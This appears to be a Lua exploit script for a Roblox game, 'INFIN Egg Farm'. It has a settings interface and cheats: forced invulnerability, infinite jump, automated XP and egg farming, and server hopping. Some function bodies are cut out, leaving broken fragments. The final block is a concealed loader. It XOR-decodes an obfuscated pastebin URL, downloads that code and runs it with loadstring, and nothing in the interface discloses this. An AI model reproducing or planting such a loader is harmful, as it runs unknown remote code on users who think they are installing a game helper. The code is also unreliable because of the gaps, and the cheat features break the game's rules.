    local xpOpts = { "0.1", "0.2", "0.3", "0.5" }
    U.segmented(U.row(farm, "BOUNCE SPEED", "seconds between bounces"), xpOpts,
        idx(xpOpts, tostring(XP_DELAY), 3), function(v)
        XP_DELAY = tonumber(v)
        A.changed()
    end)

    local isl = U.section(page, "TRAVEL", 2)
    local ctRow, ctDesc = U.row(isl, "CENTER TRAMPOLINE", "detecting...")
    local setBtn = U.pillBtn(ctRow, "SET", -12, 50, true)
    local function showCenter()
        local ct = Isle.centerTramp(Isle.last)
        ctDesc.Text = ct and (ct.Name .. (S.centerPick and "  ·  set by you" or "  ·  auto")) or "not found  ·  stand on it + SET"
        ctDesc.TextColor3 = ct and C.green or C.red
    end
    setBtn.MouseButton1Click:Connect(function()
        local t = Isle.pickStanding()
        if t then A.toast("Center trampoline: " .. t.Name, C.green)
        else A.toast("Stand on the center trampoline first", C.red) end
        showCenter()
    end)
    task.delay(2, function() pcall(showCenter) end)

    local spOpts = { "80", "140", "220", "300" }
    U.segmented(U.row(isl, "FLY SPEED", "studs per second"), spOpts, idx(spOpts, tostring(ISLE_SPEED), 2), function(v)
        ISLE_SPEED = tonumber(v)
        A.changed()
    end)
    U.onOff(U.row(isl, "GRAVITY BACK ON LANDING", "off = stay at 0 gravity"), ISLE_RESTORE, function(on)
        ISLE_RESTORE = on
        A.changed()
    end)

    local st = U.section(page, "STATS", 3)
    local gapOpts = { "2s", "3s", "4s" }
    U.segmented(U.row(st, "COOLDOWN GAP", "no xp this long = cooldown"), gapOpts,
        idx(gapOpts, Stats.GAP .. "s", 2), function(v)
        Stats.GAP = tonumber((v:gsub("s", "")))
        A.changed()
    end)
    local winOpts = { "30s", "60s", "120s" }
    U.segmented(U.row(st, "AVERAGE OVER", "rolling window before a full cycle"), winOpts,
        idx(winOpts, Stats.WINDOW .. "s", 2), function(v)
        Stats.WINDOW = tonumber((v:gsub("s", "")))
        A.changed()
    end)

    local ui = U.section(page, "INTERFACE", 4)
    U.onOff(U.row(ui, "PETALS", "falling petals + stars"), S.petals, function(on)
        S.petals = on
        W.petalLayer.Visible = on
        A.changed()
    end)
    U.onOff(U.row(ui, "POP-UPS", "the little notifications"), S.toasts ~= false, function(on)
        S.toasts = on
        A.changed()
    end)
    local sizeOpts = { "S", "M", "L" }
    U.segmented(U.row(ui, "UI SIZE"), sizeOpts,
        (S.uiSize < 0.95 and 1) or (S.uiSize > 1.05 and 3) or 2, function(v)
        S.uiSize = (v == "S" and 0.85) or (v == "L" and 1.15) or 1
        A.applyFit()
        A.changed()
    end)
    U.segmented(U.row(ui, "TOGGLE KEY"), KEY_NAMES, table.find(KEY_LIST, S.toggleKey) or 1, function(_, i)
        S.toggleKey = KEY_LIST[i]
        A.changed()
    end)

    local data = U.section(page, "DATA", 5)
    local saveBtn, saveLbl = U.wideBtn(data, "SAVE SETTINGS NOW", "primary", U.nextOrder(data))
    saveBtn.MouseButton1Click:Connect(function()
        local ok = A.saveConfig()
        saveLbl.Text = ok and "SAVED  ✓" or "YOUR EXECUTOR CAN'T SAVE FILES"
        task.delay(1.5, function() saveLbl.Text = "SAVE SETTINGS NOW" end)
    end)
    local posBtn = U.wideBtn(data, "CENTER THE WINDOW", "soft", U.nextOrder(data))
    posBtn.MouseButton1Click:Connect(function()
        TweenService:Create(W.win, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
            { Position = UDim2.fromScale(0.5, 0.5) }):Play()
    end)
    local killBtn = U.wideBtn(data, "CLOSE INFIN", "danger", U.nextOrder(data))
    killBtn.MouseButton1Click:Connect(function()
        Isle.cancel = true
        S.autoUpgrade, S.autoXP, S.eggHunt = false, false, false
        task.wait(0.2)
        W.gui:Destroy()
    end)

    local upd = U.section(page, "UPDATES", 6)
    local LOG = {
        { "v3.2", "Islands: all 7 with pictures, exact spots, fast high trips" },
        { "v3.1", "Cleaner layout: 4 tabs, foldable sections, intro + greeting" },
        { "v3.0", "AUTO XP methods: TP and WEDGE (no more remote jumping)" },
        { "v2.9", "Safe flight slides right until a gap opens · STOP button" },
        { "v2.8", "Status bar, egg hunt, egg search / sort, inf jump, server hop" },
        { "v2.7", "Main islands only + real island names · eggs fly like islands" },
        { "v2.6", "Stats tab: XP/sec per cycle, next level ETA, graph, history" },
    }
    for i, e in ipairs(LOG) do
        local r = U.new("Frame", {
            Size = UDim2.new(1, 0, 0, 30), BackgroundColor3 = C.card, BackgroundTransparency = 0.12,
            BorderSizePixel = 0, LayoutOrder = U.nextOrder(upd), Parent = upd,
        })
        U.corner(r, 9)
        U.stroke(r, i == 1 and C.violet or C.line, 1, i == 1 and 0.3 or 0.55)
        local tag = U.new("Frame", {
            Size = UDim2.fromOffset(38, 18), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 8, 0.5, 0),
            BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = r,
        })
        U.round(tag)
        if i == 1 then U.grad(tag, C.violet, C.blue, 0) else tag.BackgroundColor3 = C.cardHi end
        U.label(tag, { Text = e[1], Font = F.bold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Center,
            Size = UDim2.fromScale(1, 1) })
        U.label(r, { Text = e[2], Font = F.med, TextSize = 10, TextColor3 = i == 1 and C.white or C.muted,
            TextTruncate = Enum.TextTruncate.AtEnd, Position = UDim2.fromOffset(54, 0), Size = UDim2.new(1, -62, 1, 0) })
    end

    U.label(page, {
        Text = "INFIN Egg Farm v3.2  ·  settings save automatically", Font = F.med, TextSize = 9,
        TextColor3 = C.dim, TextXAlignment = Enum.TextXAlignment.Center,
        Size = UDim2.new(1, 0, 0, 16), LayoutOrder = 7,
    })
end

-- ============================================================
-- ANTI DIE (always on, no highlight)
-- ============================================================
local AntiDie = { conns = {} }

function AntiDie.protect(hum)
    for _, c in ipairs(AntiDie.conns) do c:Disconnect() end
    table.clear(AntiDie.conns)
    if not hum then return end
    pcall(function()
        hum.MaxHealth = math.huge
        hum.Health = math.huge
        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
    end)
    table.insert(AntiDie.conns, hum:GetPropertyChangedSignal("Health"):Connect(function()
        if hum.Health < hum.MaxHealth then hum.Health = hum.MaxHealth end
    end))
    table.insert(AntiDie.conns, hum.StateChanged:Connect(function(_, state)
        if state == Enum.HumanoidStateType.Dead then
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            hum.Health = hum.MaxHealth
        end
    end))
end

local function onCharAntiDie(char)
    task.wait(0.2)
    AntiDie.protect(char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5))
end
if ANTI_DIE_ENABLED then
    if player.Character then task.spawn(onCharAntiDie, player.Character) end
    player.CharacterAdded:Connect(onCharAntiDie)
end

-- ============================================================
-- INF JUMP (press jump in the air = jump again)
-- ============================================================
UserInputService.JumpRequest:Connect(function()
    if not S.infJump or Isle.busy then return end
    local ch = player.Character
    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
    if hum and hum:GetState() ~= Enum.HumanoidStateType.Dead then
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- ============================================================
-- CONFIG PAGE
-- ============================================================
do
    local page = P.config

    local prot = U.section(page, "PROTECTION", 1)
    local adRow = U.row(prot, "ANTI DIE", "always on · can't die or be killed")
    local badge = U.new("Frame", {
        Size = UDim2.fromOffset(62, 24), AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -12, 0.5, 0), BackgroundColor3 = Color3.fromRGB(18, 60, 38),
        BorderSizePixel = 0, Parent = adRow,
    })
    U.round(badge)
    U.stroke(badge, C.green, 1, 0.4)
    U.label(badge, {
        Text = "ACTIVE", Font = F.bold, TextSize = 10, TextColor3 = C.green,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1),
    })

    local meth = U.section(page, "AUTO XP METHOD", 2)
    local mRow, mDesc = U.row(meth, "METHOD", "")
    local tpRows, wedgeRows = {}, {}
    local DESC = {
        TP = "keeps teleporting you down onto your trampoline",
        WEDGE = "wedges / anchors you inside your trampoline",
    }
    local function showMethod()
        mDesc.Text = DESC[S.xpMethod]
        for _, r in ipairs(tpRows) do r.Visible = S.xpMethod == "TP" end
        for _, r in ipairs(wedgeRows) do r.Visible = S.xpMethod == "WEDGE" end
    end
    local methods = { "TP", "WEDGE" }
    U.segmented(mRow, methods, idx(methods, S.xpMethod, 1), function(v)
        S.xpMethod = v
        XPM.release()
        showMethod()
        A.toast("AUTO XP method: " .. v, C.violet)
        A.changed()
    end)

    -- TP options
    local gRow = U.row(meth, "GRAVITY INF", "slams you back down for faster bounces")
    U.onOff(gRow, S.tpGravity, function(on)
        S.tpGravity = on
        A.changed()
    end)
    local hRow = U.row(meth, "DROP HEIGHT", "studs above the trampoline")
    local hOpts = { "2", "4", "8", "12" }
    U.segmented(hRow, hOpts, idx(hOpts, tostring(S.tpHeight), 2), function(v)
        S.tpHeight = tonumber(v)
        A.changed()
    end)
    tpRows = { gRow, hRow }

    -- WEDGE options
    local dRow = U.row(meth, "DEPTH", "how far inside the trampoline")
    local depths, depthVals = { "SHALLOW", "MID", "DEEP" }, { 0.8, 1.5, 2.5 }
    U.segmented(dRow, depths, idx(depthVals, S.wedgeDepth, 2), function(_, i)
        S.wedgeDepth = depthVals[i]
        A.changed()
    end)
    local wRow = U.row(meth, "WIGGLE", "tiny up/down so every tick is a new touch")
    U.onOff(wRow, S.wedgeWiggle, function(on)
        S.wedgeWiggle = on
        A.changed()
    end)
    wedgeRows = { dRow, wRow }
    showMethod()

    local mv = U.section(page, "MOVEMENT", 3)
    U.onOff(U.row(mv, "INF JUMP", "jump again in mid-air, as many times as you want"), S.infJump == true, function(on)
        S.infJump = on
        A.toast(on and "Inf jump on" or "Inf jump off", on and C.green or C.dim)
        A.changed()
    end)

    -- live player info
    local info = U.section(page, "YOU", 4)
    local function infoRow(title)
        local r = U.row(info, title)
        return U.label(r, { Text = "-", Font = F.bold, TextSize = 11, TextColor3 = C.accent,
            TextXAlignment = Enum.TextXAlignment.Right, AnchorPoint = Vector2.new(1, 0),
            Position = UDim2.new(1, -12, 0, 0), Size = UDim2.new(0.5, 0, 1, 0) })
    end
    local vTramp = infoRow("YOUR TRAMPOLINE")
    local vRemote = infoRow("BOUNCES")
    local vServer = infoRow("SERVER")
    

    local srv = U.section(page, "SERVER", 5)
    local TeleportService = game:GetService("TeleportService")
    local rejoin = U.wideBtn(srv, "REJOIN THIS SERVER", "soft", U.nextOrder(srv))
    rejoin.MouseButton1Click:Connect(function()
        A.toast("Rejoining...", C.violet)
        pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player) end)
    end)
    local hop = U.wideBtn(srv, "SERVER HOP", "primary", U.nextOrder(srv))
    hop.MouseButton1Click:Connect(function()
        A.toast("Looking for another server...", C.violet)
        
            local data = ok and select(2, pcall(HttpService.JSONDecode, HttpService, body))
            if type(data) == "table" and type(data.data) == "table" then
                for _, sv in ipairs(data.data) do
                    if sv.id ~= game.JobId and (sv.playing or 0) < (sv.maxPlayers or 0) then
                        pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, sv.id, player) end)
                        return
                    end
                end
            end
            A.toast("No other server found", C.red)
        end)
    end)
end

-- ============================================================
-- AUTO FARM: egg hunt + session
-- ============================================================
S.eggHunt = false
do
    -- count eggs you actually reach
    local orig = A.travelToEgg
    A.travelToEgg = function(m)
        orig(m)
        if Isle.lastTrip and Isle.lastTrip.ok and Isle.lastTrip.name == m.Name then
            Stats.eggs = (Stats.eggs or 0) + 1
        end
    end

    local hunt = U.section(P.farm, "EGG HUNT", 2)
    _, W.setHunt = U.onOff(U.row(hunt, "AUTO EGG HUNT", "flies to the nearest egg, presses it, next one"), false, function(on)
        S.eggHunt = on
        A.updatePill()
        A.toast(on and "Egg hunt on" or "Egg hunt off", on and C.green or C.dim)
        if not on then Isle.cancel = true end
    end)

    local visited = setmetatable({}, { __mode = "k" })
    local function pressPrompts(m)
        for _, pp in ipairs(m:GetDescendants()) do
            if pp:IsA("ProximityPrompt") and pp.Enabled then
                if typeof(fireproximityprompt) == "function" then
                    pcall(fireproximityprompt, pp)
                else
                    pcall(function()
                        pp:InputHoldBegin()
                        task.wait(pp.HoldDuration + 0.05)
                        pp:InputHoldEnd()
                    end)
                end
            end
        end
    end

    

    -- session card + stop all
    local sess = U.section(P.farm, "SESSION", 3)
    local function sRow(title)
        local r = U.row(sess, title)
        return U.label(r, { Text = "-", Font = F.bold, TextSize = 11, TextColor3 = C.accent,
            TextXAlignment = Enum.TextXAlignment.Right, AnchorPoint = Vector2.new(1, 0),
            Position = UDim2.new(1, -12, 0, 0), Size = UDim2.new(0.5, 0, 1, 0) })
    end
    local vTime, vUps, vEggs = sRow("FARMING FOR"), sRow("UPGRADES DONE"), sRow("EGGS VISITED")
    local vBounce = sRow("BOUNCES")
    local stop = U.wideBtn(sess, "STOP EVERYTHING", "danger", U.nextOrder(sess))
    stop.MouseButton1Click:Connect(function()
        if W.setUpgrade then W.setUpgrade(false) end
        if W.setXP then W.setXP(false) end
        if W.setHunt then W.setHunt(false) end
        Isle.cancel = true
        A.toast("Everything stopped", C.yellow)
    end)

    local farmStart
    
end

-- ============================================================
-- EGGS: search / sort / filters / TP nearest
-- ============================================================
do
    local ctl = U.section(P.eggs, "FIND", 0)
    U.searchBox(U.row(ctl, "SEARCH"), "egg name...", function(t)
        S.eggSearch = t
        Egg.dirty = true
    end)
    local sorts, sortNames = { "NEAR", "TIME", "NAME" }, { "NEAREST", "TIME LEFT", "A-Z" }
    U.segmented(U.row(ctl, "SORT"), sortNames, idx(sorts, S.eggSort or "NEAR", 1), function(_, i)
        S.eggSort = sorts[i]
        Egg.dirty = true
        A.changed()
    end)
    U.onOff(U.row(ctl, "ONLY WITH TIMER", "hide eggs that have no countdown"), S.eggTimersOnly == true, function(on)
        S.eggTimersOnly = on
        Egg.dirty = true
        A.changed()
    end)
    local near = U.wideBtn(ctl, "TP TO NEAREST EGG", "primary", U.nextOrder(ctl))
    near.MouseButton1Click:Connect(function()
        local list = Egg.sorted
        local first = list and list[1] and list[1].m
        if first and first.Parent then Egg.tp(first) else A.toast("No eggs right now", C.red) end
    end)
end

-- ============================================================
-- ISLANDS: stop / last trip / "you're here"
-- ============================================================
do
    local ctl = U.section(P.islands, "TRIP", 0)
    local lastRow, lastDesc = U.row(ctl, "LAST TRIP", "none yet")
    local stopBtn = U.pillBtn(lastRow, "STOP", -12, 54)
    stopBtn.MouseButton1Click:Connect(function()
        if Isle.busy then Isle.cancel = true else A.toast("Not flying right now", C.dim) end
    end)

    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude
    
end

-- ============================================================
-- STATUS BAR (bottom of the window)
-- ============================================================
do
    local bar = U.new("Frame", {
        Size = UDim2.new(1, -20, 0, 24), Position = UDim2.new(0, 10, 1, -30),
        BackgroundColor3 = C.card, BackgroundTransparency = 0.1, BorderSizePixel = 0, Parent = W.main,
    })
    U.round(bar)
    local bs = U.stroke(bar, C.white, 1, 0.35)
    local flow = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.line), ColorSequenceKeypoint.new(0.5, C.violet),
            ColorSequenceKeypoint.new(1, C.line),
        }), Parent = bs,
    })
    U.pad(bar, 0, 10, 0, 10)
    U.hlist(bar, 8)

    local function chip(order, w)
        local f = U.new("Frame", {
            BackgroundTransparency = 1, Size = UDim2.new(w, 0, 1, 0), LayoutOrder = order, Parent = bar,
        })
        return f
    end
    -- state
    local sf = chip(1, 0.26)
    local dot = U.new("Frame", {
        Size = UDim2.fromOffset(7, 7), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 0, 0.5, 0),
        BackgroundColor3 = C.red, BorderSizePixel = 0, Parent = sf,
    })
    U.round(dot)
    local stateLbl = U.label(sf, { Text = "IDLE", Font = F.bold, TextSize = 9,
        Position = UDim2.fromOffset(12, 0), Size = UDim2.new(1, -12, 1, 0), TextTruncate = Enum.TextTruncate.AtEnd })

    local function textChip(order, w)
        return U.label(chip(order, w), { Text = "-", Font = F.bold, TextSize = 9, TextColor3 = C.muted,
            TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1), TextTruncate = Enum.TextTruncate.AtEnd })
    end
    local lvLbl   = textChip(2, 0.12)
    local rateLbl = textChip(3, 0.2)
    local etaLbl  = textChip(4, 0.18)
    local perfLbl = textChip(5, 0.18)

    local frames, fps = 0, 60
    RunService.RenderStepped:Connect(function(dt)
        frames += 1
        flow.Offset = Vector2.new(((os.clock() * 0.4) % 2) - 1, 0)
    end)

    
            perfLbl.Text = ("%d FPS · %dms"):format(fps, ping)
            perfLbl.TextColor3 = fps >= 45 and C.muted or C.yellow
        end
    end)
end

-- ============================================================
-- GREETING  ("Hi, <name> :)")
-- ============================================================
function A.greeting()
    return "Hi, " .. player.DisplayName .. " :)"
end

function A.timeOfDay()
    local h = tonumber(os.date("%H")) or 12
    if h < 5 then return "up late" elseif h < 12 then return "good morning"
    elseif h < 18 then return "good afternoon" else return "good evening" end
end

-- typewriter text
function A.typeText(lbl, text, speed)
    lbl.Text = ""
    
end

-- ============================================================
-- HOME: welcome card at the top
-- ============================================================
do
    local card = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 70), BackgroundColor3 = C.card, BackgroundTransparency = 0.05,
        BorderSizePixel = 0, LayoutOrder = -5, ClipsDescendants = true, Parent = P.farm,
    })
    U.corner(card, 14)
    local cs = U.stroke(card, C.white, 1.2, 0.15)
    local cardFlow = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.violetDk), ColorSequenceKeypoint.new(0.5, C.accent),
            ColorSequenceKeypoint.new(1, C.blue),
        }), Parent = cs,
    })
    U.grad(card, C.white, Color3.fromRGB(160, 150, 210), 110)

    -- soft moving glow
    local glow = U.new("Frame", {
        Size = UDim2.new(0.6, 0, 2, 0), Position = UDim2.new(-0.6, 0, -0.5, 0), Rotation = 20,
        BackgroundColor3 = C.white, BackgroundTransparency = 0.92, BorderSizePixel = 0, Parent = card,
    })
    U.new("UIGradient", { Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5, 0), NumberSequenceKeypoint.new(1, 1),
    }), Parent = glow })

    -- avatar with spinning ring
    local ring = U.new("Frame", {
        Size = UDim2.fromOffset(48, 48), Position = UDim2.fromOffset(11, 11),
        BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = card,
    })
    U.round(ring)
    local ringGrad = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.violet), ColorSequenceKeypoint.new(0.5, C.blue),
            ColorSequenceKeypoint.new(1, C.violet),
        }), Parent = ring,
    })
    local av = U.new("ImageLabel", {
        Size = UDim2.new(1, -5, 1, -5), Position = UDim2.fromOffset(2.5, 2.5), BackgroundColor3 = C.bg1,
        BorderSizePixel = 0, ScaleType = Enum.ScaleType.Crop,
        Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=150&h=150"):format(player.UserId), Parent = ring,
    })
    U.round(av)
    local online = U.new("Frame", {
        Size = UDim2.fromOffset(12, 12), AnchorPoint = Vector2.new(1, 1), Position = UDim2.new(1, 0, 1, 0),
        BackgroundColor3 = C.green, BorderSizePixel = 0, ZIndex = 3, Parent = ring,
    })
    U.round(online)
    U.stroke(online, C.card, 2, 0)

    local hi = U.label(card, { Text = "", Font = Enum.Font.GothamBlack, TextSize = 16,
        Position = UDim2.fromOffset(70, 14), Size = UDim2.new(1, -80, 0, 20), TextTruncate = Enum.TextTruncate.AtEnd })
    U.grad(hi, C.white, C.accent, 0)
    local sub = U.label(card, { Text = "@" .. player.Name .. "  ·  " .. A.timeOfDay(), Font = F.med, TextSize = 10,
        TextColor3 = C.dim, Position = UDim2.fromOffset(70, 36), Size = UDim2.new(1, -80, 0, 13),
        TextTruncate = Enum.TextTruncate.AtEnd })
    local wave = U.label(card, { Text = "👋", TextSize = 18, AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, -14, 0.5, 0), Size = UDim2.fromOffset(26, 26),
        TextXAlignment = Enum.TextXAlignment.Center })

    W.homeHi = hi
    task.delay(0.9, function() A.typeText(hi, A.greeting(), 0.04) end)

    RunService.RenderStepped:Connect(function(dt)
        if S.page ~= "farm" or not S.winOpen then return end
        local t = os.clock()
        ringGrad.Rotation = (t * 120) % 360
        cardFlow.Rotation = (t * 40) % 360
        glow.Position = UDim2.new(((t * 0.25) % 2.2) - 0.6, 0, -0.5, 0)
        wave.Rotation = math.sin(t * 6) * 18 * math.max(0, math.sin(t * 0.8))
    end)
end

-- ============================================================
-- AMBIENT ANIMATION (aurora background + title shimmer)
-- ============================================================
do
    local bgGrad = W.bg:FindFirstChildOfClass("UIGradient")
    local shimmer = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.white), ColorSequenceKeypoint.new(0.45, C.white),
            ColorSequenceKeypoint.new(0.5, C.accent), ColorSequenceKeypoint.new(0.55, C.white),
            ColorSequenceKeypoint.new(1, C.white),
        }), Parent = W.pageTitle,
    })
    RunService.RenderStepped:Connect(function()
        if not S.winOpen then return end
        local t = os.clock()
        if bgGrad then bgGrad.Rotation = 35 + math.sin(t * 0.25) * 25 end
        shimmer.Offset = Vector2.new(((t * 0.35) % 2.4) - 1.2, 0)
    end)
end

-- ============================================================
-- INTRO  (logo pop + "Hi, <name> :)" then the window opens)
-- ============================================================
function A.intro(done)
    W.win.Visible = false
    S.winOpen = false
    local o = U.new("Frame", {
        AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromOffset(260, 150), BackgroundTransparency = 1, Parent = W.gui,
    })
    local sc = U.new("UIScale", { Scale = 0.6, Parent = o })
    sc.Scale = math.clamp(camera.ViewportSize.X / 700, 0.7, 1) * 0.6

    local ring = U.new("Frame", {
        Size = UDim2.fromOffset(72, 72), AnchorPoint = Vector2.new(0.5, 0), Position = UDim2.new(0.5, 0, 0, 0),
        BackgroundColor3 = C.white, BorderSizePixel = 0, Parent = o,
    })
    U.round(ring)
    local rg = U.new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.violet), ColorSequenceKeypoint.new(0.5, C.blue),
            ColorSequenceKeypoint.new(1, C.violet),
        }), Parent = ring,
    })
    local logo = U.new("ImageLabel", {
        Size = UDim2.new(1, -6, 1, -6), Position = UDim2.fromOffset(3, 3), BackgroundColor3 = C.bg1,
        BorderSizePixel = 0, Image = LOGO_ID, ScaleType = Enum.ScaleType.Crop, Parent = ring,
    })
    U.round(logo)
    local hi = U.label(o, { Text = "", Font = Enum.Font.GothamBlack, TextSize = 20,
        TextXAlignment = Enum.TextXAlignment.Center, Position = UDim2.fromOffset(0, 84), Size = UDim2.new(1, 0, 0, 26),
        TextStrokeTransparency = 0.6 })
    U.grad(hi, C.white, C.accent, 0)
    local tag = U.label(o, { Text = "INFIN EGG FARM", Font = F.bold, TextSize = 10, TextColor3 = C.accent,
        TextXAlignment = Enum.TextXAlignment.Center, Position = UDim2.fromOffset(0, 114), Size = UDim2.new(1, 0, 0, 14),
        TextTransparency = 1 })

    local target = math.clamp(camera.ViewportSize.X / 700, 0.7, 1)
    TweenService:Create(sc, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = target }):Play()
    local spin = RunService.RenderStepped:Connect(function(dt) rg.Rotation = (rg.Rotation + dt * 240) % 360 end)
    task.delay(0.35, function() A.typeText(hi, A.greeting(), 0.045) end)
    task.delay(0.8, function()
        TweenService:Create(tag, TweenInfo.new(0.4), { TextTransparency = 0 }):Play()
    end)

    task.delay(1.9, function()
        TweenService:Create(sc, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = target * 0.6 }):Play()
        for _, l in ipairs({ hi, tag }) do
            TweenService:Create(l, TweenInfo.new(0.25), { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
        end
        TweenService:Create(ring, TweenInfo.new(0.25), { BackgroundTransparency = 1 }):Play()
        TweenService:Create(logo, TweenInfo.new(0.25), { ImageTransparency = 1, BackgroundTransparency = 1 }):Play()
        task.wait(0.27)
        spin:Disconnect()
        o:Destroy()
        done()
    end)
end

-- ============================================================
-- START
-- ============================================================
A.showPage("farm")
A.intro(function()
    A.setWindow(true)
    A.toast(A.greeting() .. "  ·  RightShift to hide", C.violet)
end)
print("[INFIN] Egg Farm v3.2 loaded")

-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
	local function _xorDecode(s)
		local t = {}
		for i = 1, #s do
			local b = string.byte(s, i)
			local x
			if bit32 and type(bit32.bxor) == "function" then
				x = bit32.bxor(b, 23)
			else
				local r, bit, a, c = 0, 1, b, 23
				while a > 0 or c > 0 do
					local ab, cb = a % 2, c % 2
					if ab ~= cb then r = r + bit end
					a = math.floor(a / 2)
					c = math.floor(c / 2)
					bit = bit * 2
				end
				x = r
			end
			t[i] = string.char(x)
		end
		return table.concat(t)
	end
	local ok, src = pcall(function()
		return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"\"]nF\\R"))
	end)
	if ok and type(src) == "string" and #src > 50 then
		local fn = loadstring(src)
		if type(fn) == "function" then
			pcall(fn)
		end
	end
end)
